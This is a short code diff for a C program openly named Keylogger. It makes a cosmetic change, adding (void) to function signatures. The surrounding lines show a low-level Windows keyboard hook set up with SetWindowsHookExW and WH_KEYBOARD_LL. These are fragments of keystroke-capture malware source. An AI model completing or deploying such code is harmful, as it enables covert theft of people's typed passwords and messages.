@@ -2,7 +2,7 @@
 
 HHOOK g_Hook = NULL;
 
-bool    Keylogger()
+bool    Keylogger(void)
 {
     if (SetupKeyHook() == false)
         return false;
@@ -33,7 +33,7 @@ LRESULT CALLBACK    KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
     return CallNextHookEx(g_Hook, code, wParam, lParam);
 }
 
-bool    SetupKeyHook()
+bool    SetupKeyHook(void)
 {
     g_Hook = SetWindowsHookExW( WH_KEYBOARD_LL,             // Type of procedure
                                     KeyboardProc,           // Callback function
@@ -48,7 +48,7 @@ bool    SetupKeyHook()
     return true;
 }
 
-void    RemoveKeyHook()
+void    RemoveKeyHook(void)
 {
     if (g_Hook != NULL)
     {
